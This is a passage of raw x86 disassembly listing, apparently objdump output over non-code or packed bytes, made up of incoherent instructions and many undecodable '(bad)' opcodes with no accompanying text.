  41b774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b775:	inc    ecx
  41b776:	lahf   
  41b777:	mov    esp,0xf9818e44
  41b77c:	sub    edi,DWORD PTR [edx]
  41b77e:	pop    esp
  41b77f:	add    BYTE PTR [edi],ah
  41b781:	hlt    
  41b782:	add    eax,0xb9e35693
  41b787:	xchg   esi,eax
  41b788:	mov    WORD PTR [ebx-0x9],fs
  41b78b:	scas   eax,DWORD PTR es:[edi]
  41b78c:	shl    DWORD PTR [edi],0x69
  41b78f:	outs   dx,DWORD PTR ds:[esi]
  41b790:	sbb    ah,BYTE PTR [edi]
  41b792:	sub    edx,DWORD PTR [ecx+0x60df9a7b]
  41b798:	inc    esi
  41b799:	sub    al,0x16
  41b79b:	jno    0x41b7d4
  41b79d:	xchg   ecx,eax
  41b79e:	std    
  41b79f:	mov    bh,0xab
  41b7a1:	push   edi
  41b7a2:	loope  0x41b812
  41b7a4:	and    esi,DWORD PTR [eax]
  41b7a6:	jns    0x41b75d
  41b7a8:	adc    esi,DWORD PTR [esp+esi*8+0x6479f828]
  41b7af:	sbb    dh,BYTE PTR [edx+0x19527f3]
  41b7b5:	xchg   edi,eax
  41b7b6:	aaa    
  41b7b7:	outs   dx,DWORD PTR ds:[esi]
  41b7b8:	or     al,0x4
  41b7ba:	push   edi
  41b7bb:	out    0x82,eax
  41b7bd:	xor    DWORD PTR [ecx+edx*1+0x1dfd95fe],ebx
  41b7c4:	xchg   BYTE PTR [ecx+0x3673882d],ah
  41b7ca:	cmp    eax,0x96c9daaf
  41b7cf:	das    
  41b7d0:	sbb    eax,DWORD PTR [edi+0xd]
  41b7d3:	jmp    0xa6ab8db8
  41b7d8:	out    0x8f,al
  41b7da:	out    dx,al
  41b7db:	xchg   ebx,eax
  41b7dc:	mov    esi,DWORD PTR [edi]
  41b7de:	mov    dl,0xba
  41b7e0:	jne    0x41b811
  41b7e2:	and    bh,BYTE PTR [esi]
  41b7e4:	push   0xffffffcc
  41b7e6:	mov    ebx,0x4aa1a99e
  41b7eb:	push   eax
  41b7ec:	loope  0x41b7e9
  41b7ee:	sbb    al,0xbd
  41b7f0:	jb     0x41b835
  41b7f2:	cmp    ebx,DWORD PTR [edx+0x6f]
  41b7f5:	cld    
  41b7f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7f7:	inc    edx
  41b7f8:	pop    es
  41b7f9:	imul   ecx,DWORD PTR ds:0x38337309,0x2107e7a
  41b803:	mov    DWORD PTR [edx+0x64e41447],esp
  41b809:	lea    ebx,[edi-0x1d]
  41b80c:	mov    ebp,0x3426a315
  41b811:	sbb    eax,0x949bf38f
  41b816:	fsub   QWORD PTR [esi-0x13]
  41b819:	sahf   
  41b81a:	jne    0x41b7cf
  41b81c:	sahf   
  41b81d:	cmp    BYTE PTR [edi-0x76941b90],al
  41b823:	mov    edi,0x1f72817e
  41b828:	iret   
  41b829:	mov    dh,0xa7
  41b82b:	mov    ds:0x4e0934f0,al
  41b830:	loope  0x41b868
  41b832:	mov    al,0x8c
  41b834:	xchg   ecx,eax
  41b835:	cld    
  41b836:	pop    edx
  41b837:	mov    ah,0x46
  41b839:	jmp    0x73a3:0xc9bdfb1c
  41b840:	jp     0x41b801
  41b842:	jmp    0x1cb7:0xdc9b5f78
  41b849:	pusha  
  41b84a:	adc    ch,BYTE PTR [ecx]
  41b84c:	sar    DWORD PTR [eax],0xde
  41b84f:	jne    0x41b83c
  41b851:	out    dx,eax
  41b852:	jecxz  0x41b7ff
  41b854:	int3   
  41b855:	and    eax,0x78dfedde
  41b85a:	repz ss add al,0x2e
  41b85e:	dec    ecx
  41b85f:	dec    ebx
  41b860:	push   ebp
  41b861:	pop    ebp
  41b862:	adc    DWORD PTR [ebp+0x471a2e9b],edx
  41b868:	mov    cl,0xa1
  41b86a:	(bad)  
  41b86b:	test   eax,0x6d4717c4
  41b870:	fadd   QWORD PTR [ebx-0x17]
  41b873:	pop    edi
  41b874:	loop   0x41b80e
  41b876:	jmp    0xb989:0xccefe83d
  41b87d:	or     BYTE PTR ds:0x9309d689,bl
  41b883:	jmp    0x424797ce
  41b888:	hlt    
  41b889:	sbb    ch,BYTE PTR [edi+0x7d]
  41b88c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b88d:	push   eax
  41b88e:	mov    edi,0xc0b967ad
  41b893:	(bad)  
  41b894:	in     al,0x20
  41b896:	les    esi,FWORD PTR [eax-0x5cfd4b00]
  41b89c:	(bad)
  41b89f:	jne    0x41b82f
  41b8a1:	pop    ecx
  41b8a2:	addr16 xor al,0xe
  41b8a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8a6:	fst    QWORD PTR [ecx+0x27]
  41b8a9:	neg    BYTE PTR [eax+ecx*2]
  41b8ac:	push   ds
  41b8ad:	sub    bh,BYTE PTR [eax]
  41b8af:	gs lahf 
  41b8b1:	out    dx,eax
  41b8b2:	repnz dec edi
  41b8b4:	xchg   BYTE PTR [eax],ah
  41b8b6:	loop   0x41b856
  41b8b8:	xchg   esp,eax
  41b8b9:	xchg   ebp,eax
  41b8ba:	push   ebp
  41b8bb:	scas   eax,DWORD PTR es:[edi]
  41b8bc:	retf   0x69f8
  41b8bf:	cmc    
  41b8c0:	mov    al,0x84
  41b8c2:	and    eax,ebx
  41b8c4:	mov    cl,0xa2
  41b8c6:	in     al,0x5f
  41b8c8:	add    BYTE PTR ds:0x2b7b55c1,ah
  41b8ce:	sub    DWORD PTR [ecx+0x5cbc500b],ebp
  41b8d4:	inc    edi
  41b8d5:	mov    ch,0x56
  41b8d7:	pop    ss
  41b8d8:	mov    al,0xe0
  41b8da:	lock out dx,al
  41b8dc:	dec    eax
  41b8dd:	sbb    BYTE PTR [ecx-0xb],ah
  41b8e0:	push   0x66
  41b8e2:	sahf   
  41b8e3:	jge    0x41b8d7
  41b8e5:	lods   eax,DWORD PTR ds:[esi]
  41b8e6:	loope  0x41b8c8
  41b8e8:	es repnz xor cl,dl
  41b8ec:	fisttp DWORD PTR [edi+edx*4+0x55ab570b]
  41b8f3:	inc    eax
  41b8f4:	(bad)  
  41b8f5:	dec    esi
  41b8f6:	jge    0x41b953
  41b8f8:	test   BYTE PTR [ecx+eax*8-0x58582e75],ah
  41b8ff:	scas   eax,DWORD PTR es:[edi]
  41b900:	ret    
  41b901:	inc    ebp
  41b902:	xor    edi,DWORD PTR [ebx+0x1f]
  41b905:	(bad)  
  41b906:	xchg   edi,eax
  41b907:	inc    ebp
  41b908:	adc    ecx,DWORD PTR [edi+0x69]
  41b90b:	cmp    edi,esi
  41b90d:	lds    ebx,FWORD PTR [ecx+0x4a241d04]
  41b913:	imul   ecx,DWORD PTR [edx],0x9485263a
  41b919:	mul    BYTE PTR [esi+ebx*1]
  41b91c:	lods   eax,DWORD PTR ds:[esi]
  41b91d:	ror    al,1
  41b91f:	(bad)  
  41b920:	mov    al,ds:0x7c3f0a29
  41b925:	popf   
  41b926:	mov    eax,ds:0x21ca2fb2
  41b92b:	test   al,0xbe
  41b92d:	add    eax,0xbb881af7
  41b932:	sbb    al,0xa1
  41b934:	sbb    eax,0xc9b747f4
  41b939:	js     0x41b943
  41b93b:	and    eax,0xe8a1ca8d
  41b940:	and    ch,dl
  41b942:	cld    
  41b943:	es popa 
  41b945:	lahf   
  41b946:	cmovs  eax,DWORD PTR [edx-0x7bf704cb]
  41b94d:	out    0xa5,eax
  41b94f:	call   0x3f15:0xa7aae649
  41b956:	add    BYTE PTR [ebx],cl
  41b958:	mov    ds:0x77c4d6dc,al
  41b95d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b95e:	or     al,0xc8
  41b960:	rcl    DWORD PTR [ecx],1
  41b962:	sub    DWORD PTR [esp+esi*8-0x4480a90b],ebx
  41b969:	inc    eax
  41b96a:	hlt    
  41b96b:	push   ebp
  41b96c:	jg     0x41b9cf
  41b96e:	jnp    0x41b933
  41b970:	pop    edi
  41b971:	imul   esp,DWORD PTR [ebp+edx*4+0x1d],0x26
  41b976:	sbb    al,0x43
  41b978:	fdivr  DWORD PTR [ebx-0x5a]
  41b97b:	popa   
  41b97c:	cld    
  41b97d:	arpl   WORD PTR [eax+ebp*4],bx
  41b980:	loope  0x41b9c9
  41b982:	xchg   ecx,eax
  41b983:	enter  0x2711,0x89
  41b987:	fidivr DWORD PTR [ebp+0x61]
  41b98a:	(bad)  
  41b98b:	jge    0x41ba02
  41b98d:	push   ds
  41b98e:	rcl    al,cl
  41b990:	pop    esi
  41b991:	mov    esi,0x8b98d456
  41b996:	sbb    bh,BYTE PTR [edx]
  41b998:	ja     0x41b9f5
  41b99a:	xor    esp,ebx
  41b99c:	mov    edx,0x3761267f
  41b9a1:	stos   DWORD PTR es:[edi],eax
  41b9a2:	lock and DWORD PTR [edi+0x575a20aa],ebx
  41b9a9:	sub    eax,0x525aecc0
  41b9ae:	sub    DWORD PTR [esi-0x1ca656c4],eax
  41b9b4:	jmp    0x41b9fc
  41b9b6:	(bad)  
  41b9b7:	cld    
  41b9b8:	dec    edi
  41b9b9:	adc    eax,0xb63f6ea0
  41b9be:	pop    ds
  41b9bf:	inc    esp
  41b9c0:	fnstsw WORD PTR [ecx+0x14c2830b]
  41b9c6:	mov    eax,0x726dc7bc
  41b9cb:	loop   0x41ba01
  41b9cd:	es aaa 
  41b9cf:	sbb    al,0x7d
  41b9d1:	shr    BYTE PTR [esi],1
  41b9d3:	mov    ds:0x49881d11,al
  41b9d8:	in     eax,0x69
  41b9da:	cmp    BYTE PTR [ecx+0x5b],ah
  41b9dd:	sub    eax,0xc020ca3b
  41b9e2:	(bad)  
  41b9e3:	not    BYTE PTR [ecx]
  41b9e5:	addr16 push ecx
  41b9e7:	jge    0x41b9c0
  41b9e9:	int3   
  41b9ea:	lahf   
  41b9eb:	mov    ebx,0xd2a8ef97
  41b9f0:	pop    esp
  41b9f1:	fs xchg edx,eax
  41b9f3:	rcr    BYTE PTR [esi],cl
  41b9f5:	fstp   QWORD PTR [edx]
  41b9f7:	mov    dh,BYTE PTR ds:0xab759ae2
  41b9fd:	mov    BYTE PTR [ecx+eiz*8],bh
  41ba00:	mov    eax,0x508d747c
  41ba05:	and    BYTE PTR [eax-0x2982d2ba],0xbe
  41ba0c:	xchg   esp,eax
  41ba0d:	push   esp
  41ba0e:	or     DWORD PTR [eax-0x2f950b61],ebp
  41ba14:	xor    eax,0xe88035a0
  41ba19:	test   BYTE PTR [ecx+0x264caadc],bl
  41ba1f:	mov    ds,WORD PTR [ecx+0x332fa389]
  41ba25:	js     0x41b9b8
  41ba27:	mov    ah,0x8e
  41ba29:	jmp    0x41baa3
  41ba2b:	add    edi,esi
  41ba2d:	jmp    0x41ba42
  41ba2f:	inc    dh
  41ba31:	sbb    DWORD PTR [ecx+0x7d613e0b],esi
  41ba37:	sahf   
  41ba38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba39:	data16 mov cl,0x93
  41ba3c:	enter  0x8ea5,0x8
  41ba40:	ja     0x41ba28
  41ba42:	adc    ah,BYTE PTR [edx]
  41ba44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba45:	xchg   esi,esi
  41ba47:	in     eax,dx
  41ba48:	adc    esp,DWORD PTR [edi]
  41ba4a:	push   0x52f95e77
  41ba4f:	push   esi
  41ba50:	pop    edx
  41ba51:	add    DWORD PTR [eax],edi
  41ba53:	mov    ecx,0x78ede6f8
  41ba58:	(bad)  
  41ba59:	or     al,0x5d
  41ba5b:	xor    al,0x6c
  41ba5e:	(bad)  
  41ba5f:	rol    DWORD PTR [edx+eiz*1+0x15452ce2],1
  41ba66:	or     ebp,DWORD PTR [edx+eax*1]
  41ba69:	adc    DWORD PTR [esi+edx*2],eax
  41ba6c:	xor    ebx,DWORD PTR [esi]
  41ba6e:	adc    ebx,edi
  41ba70:	jbe    0x41baa2
  41ba72:	gs push cs
  41ba74:	mov    cl,0xd5
  41ba76:	out    0xb0,al
  41ba78:	cmp    esp,esp
  41ba7a:	pop    ebp
  41ba7b:	sub    al,0x23
  41ba7d:	cmp    dl,BYTE PTR [eax-0x46]
  41ba80:	pop    ebp
  41ba81:	into   
  41ba82:	scas   eax,DWORD PTR es:[edi]
  41ba83:	scas   al,BYTE PTR es:[edi]
  41ba84:	call   0xd1a3:0xa7dc8127
  41ba8b:	push   edx
  41ba8c:	cmp    bh,BYTE PTR ds:0xe514d945
  41ba92:	dec    esp
  41ba93:	inc    esp
  41ba94:	pusha  
  41ba95:	and    edx,esp
  41ba97:	fcom   DWORD PTR [edx]
  41ba99:	inc    esp
  41ba9a:	fnsave [edi-0xf]
  41ba9d:	xlat   BYTE PTR ds:[ebx]
  41ba9e:	and    ebp,ebp
  41baa0:	mov    eax,0x3fa48409
  41baa6:	and    al,0x9
  41baa8:	pusha  
  41baa9:	mov    ebx,0x94714659
  41baae:	jo     0x41ba40
  41bab0:	pop    esi
  41bab1:	loopne 0x41bafd
  41bab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bab4:	xchg   edx,eax
  41bab5:	pop    esp
  41bab6:	dec    esi
  41bab7:	stos   BYTE PTR es:[edi],al
  41bab8:	mov    ?,WORD PTR [edi+0x5cc32a8c]
  41babe:	and    al,cl
  41bac0:	jl     0x41ba8c
  41bac2:	hlt    
  41bac3:	adc    BYTE PTR [edx+ebp*2-0x75b61937],bl
  41baca:	inc    esi
  41bacb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bacc:	pop    ebx
  41bacd:	imul   esp,DWORD PTR [esi+0x1a],0xffffff8d
  41bad1:	mov    cl,0x94
  41bad3:	out    0xde,eax
  41bad5:	xchg   edi,eax
  41bad6:	jmp    0x56cda9fc
  41badb:	repnz dec ecx
  41badd:	jo     0x41bb3b
  41badf:	(bad)  
  41bae0:	cli    
  41bae1:	add    edx,DWORD PTR [esi+0x75]
  41bae4:	jnp    0x41ba77
  41bae6:	mov    bh,0xc1
  41bae8:	stos   DWORD PTR es:[edi],eax
  41bae9:	int    0xa1
  41baeb:	inc    ecx
  41baec:	jmp    0xacc7:0xdefea06a
  41baf3:	cwde   
  41baf4:	jge    0x41bb3e
  41baf6:	sbb    al,0xe4
  41baf8:	jg     0x41badc
  41bafa:	out    dx,al
  41bafb:	mov    ds:0x4e8953c1,eax
  41bb00:	inc    edi
  41bb01:	pushf  
  41bb02:	inc    edx
  41bb03:	xor    DWORD PTR [ecx+esi*2],edi
  41bb06:	dec    edi
  41bb07:	or     cl,bl
  41bb09:	repnz or bl,dh
  41bb0c:	and    eax,0x9d7389c3
  41bb11:	aaa    
  41bb12:	or     DWORD PTR [edx+esi*1+0x52c96a97],0x39
  41bb1a:	sysenter 
  41bb1c:	loope  0x41bac3
  41bb1e:	(bad)  
  41bb20:	push   0xffffffeb
  41bb22:	jle    0x41bb96
  41bb24:	xor    BYTE PTR [edi-0x71],bl
  41bb27:	mov    ds:0xca5ac38a,eax
  41bb2c:	fiadd  WORD PTR [edx-0x54]
  41bb2f:	loope  0x41bb63
  41bb31:	sbb    DWORD PTR [bx+si+0x30],0xf
  41bb36:	or     eax,0x31d60c30
  41bb3b:	dec    ebx
  41bb3c:	mov    edx,0x17fa543c
  41bb41:	inc    ebx
  41bb42:	xor    eax,0x8647d02
  41bb47:	inc    esp
  41bb48:	push   ecx
  41bb49:	enter  0xcd85,0x5d
  41bb4d:	mul    BYTE PTR [ecx]
  41bb4f:	or     DWORD PTR ds:0x33fa8230,ecx
  41bb55:	or     ebp,DWORD PTR ds:0xd0fc1b4d
  41bb5b:	repz cmp BYTE PTR [edx],al
  41bb5e:	call   0x4a71:0xc0d50bad
  41bb65:	pop    edi
  41bb66:	add    al,0xeb
  41bb68:	mov    bl,0xde
  41bb6a:	push   esp
  41bb6b:	ins    BYTE PTR es:[edi],dx
  41bb6c:	sub    ebx,DWORD PTR [eax+0x50ab16ca]
  41bb72:	mov    bl,0x85
  41bb74:	popa   
  41bb75:	mov    ch,0x96
  41bb77:	(bad)
  41bb7a:	arpl   WORD PTR [ebp*8-0x3ee42194],sp
  41bb81:	mov    edx,0xaf0a0694
  41bb86:	out    dx,eax
  41bb87:	push   esp
  41bb88:	bound  edx,QWORD PTR [edx-0x24]
  41bb8b:	and    eax,edi
  41bb8d:	test   al,0xb
  41bb8f:	jo     0x41bb12
  41bb91:	pop    eax
  41bb92:	cmp    DWORD PTR [esi+0x6f],ebp
  41bb95:	mov    ah,0x4e
  41bb97:	jge    0x41bb7f
  41bb99:	or     BYTE PTR [edi+0x30181e98],ah
  41bb9f:	xchg   esp,eax
  41bba0:	or     BYTE PTR [ebp+0x34],bl
  41bba3:	das    
  41bba4:	add    al,0xb3
  41bba6:	out    0x7,eax
  41bba8:	cmp    ch,BYTE PTR ds:0x2b8abd85
  41bbae:	lea    ecx,[ecx+edx*8+0x2eace6e1]
  41bbb5:	fld    DWORD PTR [ebx]
  41bbb7:	fld    TBYTE PTR [eax-0x194feb4a]
  41bbbd:	ret    0x9f2e
  41bbc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbc1:	retf   
  41bbc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbc3:	push   ebx
  41bbc4:	add    eax,0xf25bb7ed
  41bbc9:	scas   al,BYTE PTR es:[edi]
  41bbca:	arpl   WORD PTR [edx+0x2d],si
  41bbcd:	(bad)  
  41bbce:	and    ah,BYTE PTR [eax-0x2034c458]
  41bbd4:	pop    esi
  41bbd5:	xor    cl,BYTE PTR [edi+0x5ad44c74]
  41bbdb:	inc    eax
  41bbdc:	shl    BYTE PTR [ebp-0x1ad3ce6a],0x9c
  41bbe3:	je     0x41bbfc
  41bbe5:	jbe    0x41bc65
  41bbe7:	ret    
  41bbe8:	aam    0x91
  41bbea:	(bad)  
  41bbeb:	std    
  41bbec:	out    0xcc,eax
  41bbee:	push   ds
  41bbef:	fldz   
  41bbf1:	fidivr WORD PTR [ebp-0x53]
  41bbf4:	adc    cl,BYTE PTR [edi-0x31]
  41bbf7:	lods   al,BYTE PTR fs:[esi]
  41bbf9:	jmp    0x150b:0xf6c4e73d
  41bc00:	(bad)  
  41bc01:	fist   WORD PTR [ecx-0x2d]
  41bc04:	jno    0x41bc01
  41bc06:	sub    dl,BYTE PTR [ecx+ecx*4-0x4f]
  41bc0a:	xchg   DWORD PTR [edi-0x1d4d98a1],edx
  41bc10:	push   cs
  41bc11:	(bad)  
  41bc12:	call   0xc863:0x852121f0
  41bc19:	mov    ch,0x7f
  41bc1b:	xchg   DWORD PTR [ecx+0x1514fe30],edx
  41bc21:	mov    cl,al
  41bc23:	clc    
  41bc24:	fdivr  DWORD PTR [edx+ebp*1+0x1b06d3d0]
  41bc2b:	cmp    bl,BYTE PTR [eax]
  41bc2d:	jg     0x41bbef
  41bc2f:	cmp    bl,BYTE PTR [ebp+0x51]
  41bc32:	test   al,0x45
  41bc34:	or     ah,BYTE PTR [eax-0x50]
  41bc37:	shr    BYTE PTR [ecx+0x16],0x3c
  41bc3b:	adc    eax,0x48b6193e
  41bc40:	in     al,0x47
  41bc42:	sbb    al,0x3d
  41bc44:	inc    ebp
  41bc45:	and    eax,0x774c5aab
  41bc4a:	sbb    ch,cl
  41bc4c:	ret    0xc643
  41bc4f:	cmp    ch,dh
  41bc51:	sbb    ah,cl
  41bc53:	push   esi
  41bc54:	inc    eax
  41bc55:	rol    DWORD PTR [edi+ebx*1-0x15],1
  41bc59:	xor    eax,0xc971950b
  41bc5e:	mov    cl,0x45
  41bc60:	jl     0x41bca3
  41bc62:	hlt    
  41bc63:	aas    
  41bc64:	inc    esp
  41bc65:	push   ss
  41bc66:	and    BYTE PTR [esp+ebx*2],ch
  41bc69:	das    
  41bc6a:	in     eax,0xae
  41bc6c:	es inc esp
  41bc6e:	dec    edx
  41bc6f:	enter  0x8ee8,0x26
  41bc73:	inc    ecx
  41bc74:	add    dh,BYTE PTR [esi+0x21f2af6f]
  41bc7a:	fbstp  TBYTE PTR [ecx+0x6e]
  41bc7d:	fnstenv [ecx]
  41bc7f:	pop    ds
  41bc80:	cmp    dl,BYTE PTR [eax+0x16]
  41bc83:	cs retf 
  41bc85:	daa    
  41bc86:	or     al,0xcd
  41bc88:	pop    esp
  41bc89:	and    BYTE PTR [ecx],bh
  41bc8b:	cmp    eax,0xef09818c
  41bc90:	int    0xda
  41bc92:	adc    al,0x90
  41bc94:	out    dx,al
  41bc95:	std    
  41bc96:	push   ecx
  41bc97:	xchg   BYTE PTR [esi-0x5d76579e],bh
  41bc9d:	test   DWORD PTR [edi-0x4d],eax
  41bca0:	pop    edi
  41bca1:	pop    esp
  41bca2:	push   ebx
  41bca3:	sbb    eax,0xb0a1568b
  41bca8:	sub    eax,0x5c7d3080
  41bcad:	push   esi
  41bcae:	mov    dl,0xf8
  41bcb0:	rcr    DWORD PTR [edx-0x14],cl
  41bcb3:	loopne 0x41bd1f
  41bcb5:	(bad)  
  41bcb6:	mov    ebp,0xb7ed5f79
  41bcbb:	es hlt 
  41bcbd:	mov    ah,0x10
  41bcbf:	push   edx
  41bcc0:	ss cli 
  41bcc2:	and    eax,0x9e87c0df
  41bcc7:	push   0x4f8f53e
  41bccc:	std    
  41bccd:	int3   
  41bcce:	(bad)  
  41bccf:	cmp    ecx,DWORD PTR [eax]
  41bcd1:	in     eax,dx
  41bcd2:	out    dx,al
  41bcd3:	push   ss
  41bcd4:	pop    ebx
  41bcd5:	test   al,0x29
  41bcd7:	loopne 0x41bd38
  41bcd9:	inc    esp
  41bcda:	je     0x41bcd4
  41bcdc:	adc    ecx,esp
  41bcde:	stos   BYTE PTR es:[edi],al
  41bcdf:	xor    DWORD PTR [ecx+0x39ba7925],edx
  41bce5:	mov    WORD PTR [eax+0x60],es
  41bce8:	bound  ebx,QWORD PTR [edx]
  41bcea:	push   cs
  41bceb:	jecxz  0x41bd1e
  41bced:	pop    edi
  41bcee:	dec    edx
  41bcef:	int3   
  41bcf0:	xor    al,0x25
  41bcf2:	(bad)  
  41bcf3:	push   ds
  41bcf4:	cdq    
  41bcf5:	scas   eax,DWORD PTR es:[edi]
  41bcf6:	das    
  41bcf7:	add    BYTE PTR [eax],bh
  41bcf9:	outs   dx,BYTE PTR ds:[esi]
  41bcfa:	xchg   ch,dh
  41bcfc:	and    dh,cl
  41bcfe:	xor    esi,DWORD PTR [edx+eax*8+0x43]
  41bd02:	cdq    
  41bd03:	(bad)  
  41bd04:	dec    edx
  41bd05:	pop    ebp
  41bd06:	push   ebx
  41bd07:	out    0x38,eax
  41bd09:	repz and esi,DWORD PTR [esi]
  41bd0c:	adc    al,0x8c
  41bd0e:	and    DWORD PTR [ebx-0x29],edi
  41bd11:	and    BYTE PTR [esi+esi*8+0x7af63eff],bl
  41bd18:	jno    0x41bcf1
  41bd1a:	loope  0x41bd1b
  41bd1c:	xchg   ebx,eax
  41bd1d:	shr    BYTE PTR [ebp*2+0x356054e7],cl
  41bd24:	sub    al,0x8c
  41bd26:	inc    eax
  41bd27:	cmp    BYTE PTR [edx+0x5a],al
  41bd2a:	call   0xcb1532c2
  41bd2f:	adc    DWORD PTR [ebx+0x5faaef1d],0x65
  41bd36:	pushf  
  41bd37:	xchg   eax,ebp
  41bd39:	pop    esi
  41bd3a:	cmc    
  41bd3b:	add    eax,0x847dac0d
  41bd40:	xchg   edx,eax
  41bd41:	sub    dl,BYTE PTR ds:0x148eb46c
  41bd47:	jne    0x41bd9e
  41bd49:	cmp    eax,0x262538db
  41bd4e:	and    al,0xda
  41bd50:	jnp    0x41bd2e
  41bd52:	push   ss
  41bd53:	jp     0x41bd5c
  41bd55:	and    ebx,DWORD PTR [edx]
  41bd57:	mov    ds:0xad4d4488,al
  41bd5c:	fidivr DWORD PTR [ebx+0x7e3d60b6]
  41bd62:	cmp    esi,DWORD PTR [esi]
  41bd64:	inc    ebp
  41bd65:	mov    WORD PTR [eax+0x72],fs
  41bd68:	(bad)  
  41bd69:	fstp   st(2)
  41bd6b:	ins    DWORD PTR es:[edi],dx
  41bd6c:	dec    edx
  41bd6d:	or     bl,dl
  41bd6f:	cdq    
  41bd70:	jmp    0x41bd22
  41bd72:	inc    ecx
  41bd73:	xchg   ebx,eax
  41bd74:	std    
  41bd75:	mov    eax,0xf277f1f8
  41bd7a:	sahf   
  41bd7b:	ss daa 
  41bd7d:	jbe    0x41bdef
  41bd7f:	jp     0x41bd93
  41bd81:	sbb    ebx,DWORD PTR [edi+0x1014866b]
  41bd87:	je     0x41bd99
  41bd89:	mov    WORD PTR [esi-0x9bb75fa],es
  41bd8f:	push   esp
  41bd90:	jnp    0x41bdf8
  41bd92:	dec    edi
  41bd93:	mov    BYTE PTR [esi],0x8a
  41bd96:	xchg   ebx,eax
  41bd97:	out    0x69,al
  41bd99:	pop    ebp
  41bd9a:	mov    al,0xcb
  41bd9c:	ret    0x6deb
  41bd9f:	adc    DWORD PTR [ebx-0x1c38573d],esi
  41bda5:	popa   
  41bda6:	out    dx,eax
  41bda7:	arpl   WORD PTR [ebp+0x67019ddb],cx
  41bdad:	push   edx
  41bdae:	leave  
  41bdaf:	add    ecx,ebp
  41bdb1:	jns    0x41bd9d
  41bdb3:	pop    si
  41bdb5:	inc    esp
  41bdb6:	inc    edx
  41bdb7:	sub    edi,DWORD PTR [ebp+0x53eacbf3]
  41bdbd:	jmp    0xfcee866
  41bdc2:	les    esi,FWORD PTR [edx]
  41bdc4:	icebp  
  41bdc5:	sbb    al,0x14
  41bdc7:	push   edx
  41bdc8:	clc    
  41bdc9:	pop    esp
  41bdca:	shl    BYTE PTR [ebx-0x3a38dab8],cl
  41bdd0:	loope  0x41be2d
  41bdd2:	or     BYTE PTR ds:0x2e6859a8,ch
  41bdd8:	and    eax,DWORD PTR [eax+ebp*2]
  41bddb:	aas    
  41bddc:	icebp  
  41bddd:	jns    0x41be49
  41bddf:	lods   eax,DWORD PTR ds:[esi]
  41bde0:	(bad)  
  41bde1:	jge    0x41bdee
  41bde3:	int3   
  41bde4:	sub    cl,BYTE PTR [ebx-0x62]
  41bde7:	cmp    BYTE PTR [ebx+0x42],cl
  41bdea:	cld    
  41bdeb:	jmp    0x41be52
  41bded:	jge    0x41be3f
  41bdef:	jl     0x41be26
  41bdf1:	push   esi
  41bdf2:	pop    es
  41bdf3:	pop    ebx
  41bdf4:	les    edi,FWORD PTR [ecx-0x61]
  41bdf7:	adc    esi,DWORD PTR [ebx+eax*8-0x3d218692]
  41bdfe:	fdivr  st(1),st
  41be00:	mov    esi,0x8ce7ebbd
  41be05:	loopne 0x41bded
  41be07:	cli    
  41be08:	push   ebp
  41be09:	sub    eax,0x76f2ca1e
  41be0e:	in     al,0xdb
  41be10:	sub    DWORD PTR [ecx],edx
  41be12:	gs mov edx,0xae1b6b03
  41be18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be19:	std    
  41be1a:	das    
  41be1b:	stos   DWORD PTR es:[edi],eax
  41be1c:	push   esp
  41be1d:	in     al,dx
  41be1e:	iret   
  41be1f:	std    
  41be20:	adc    DWORD PTR [eax],0xb0b40782
  41be26:	mov    ah,0x30
  41be28:	sbb    al,0x89
  41be2a:	or     al,0xc4
  41be2c:	dec    si
  41be2e:	ret    
  41be2f:	int3   
  41be30:	pop    ebx
  41be31:	popa   
  41be32:	push   ss
  41be33:	dec    edi
  41be34:	dec    esi
  41be35:	push   edx
  41be36:	pop    ebp
  41be37:	mov    ebx,0x6a4e5013
  41be3c:	and    dh,BYTE PTR [eax+0x5b]
  41be3f:	not    DWORD PTR [esi-0x55fb6476]
  41be45:	xor    al,0xef
  41be47:	rcl    BYTE PTR [edi-0x48],1
  41be4a:	(bad)  
  41be4b:	in     al,0x0
  41be4d:	je     0x41be68
  41be4f:	gs pop ebx
  41be51:	sbb    eax,DWORD PTR [ecx+0x6c555937]
  41be57:	jae    0x41be93
  41be59:	loope  0x41be7e
  41be5b:	nop
  41be5c:	ret    
  41be5d:	or     cl,cl
  41be5f:	pushf  
  41be60:	mov    edi,0x92d20204
  41be65:	or     esp,ebp
  41be67:	cmc    
  41be68:	and    al,0x8f
  41be6a:	add    eax,0xf4108af0
  41be6f:	or     ebp,esi
  41be71:	sahf   
  41be72:	inc    edx
  41be73:	sub    BYTE PTR [ebp-0x717492c7],cl
  41be79:	arpl   WORD PTR [edi+ebp*4-0x6f],bp
  41be7d:	add    eax,0x509d9c0
  41be82:	mov    al,0x7d
  41be84:	rol    bh,1
  41be86:	sub    al,dh
  41be88:	xor    ah,BYTE PTR [eax+eiz*2-0x1a8677cf]
  41be8f:	add    DWORD PTR [esi+0x439c4d7c],edi
  41be95:	imul   DWORD PTR [ecx-0x18]
  41be98:	lds    eax,FWORD PTR [edi+0x6c4b1834]
  41be9e:	in     al,dx
  41be9f:	mov    ds:0xb1c6f86e,eax
  41bea4:	xlat   BYTE PTR ds:[ebx]
  41bea5:	ret    0x45a6
  41bea8:	loope  0x41be39
  41beaa:	out    dx,eax
  41beab:	shl    bl,1
  41bead:	retf   0x13ef
  41beb0:	inc    esp
  41beb1:	retf   
  41beb2:	push   edx
  41beb3:	jbe    0x41bee1
  41beb5:	dec    ebp
  41beb6:	xor    BYTE PTR [esi-0x390e1ebc],ch
  41bebc:	mov    ebp,0xc18eb709
  41bec1:	arpl   WORD PTR [esi+0x7],ax
  41bec4:	mov    dl,0x26
  41bec6:	jne    0x41beb8
  41bec8:	sahf   
  41bec9:	fld    DWORD PTR [esi-0x37]
  41becc:	ret    
  41becd:	fs icebp 
  41becf:	fs pop eax
  41bed1:	imul   eax,DWORD PTR [edx+0x15],0xfebb03a1
  41bed8:	(bad)  
  41bed9:	call   0xde41c40a
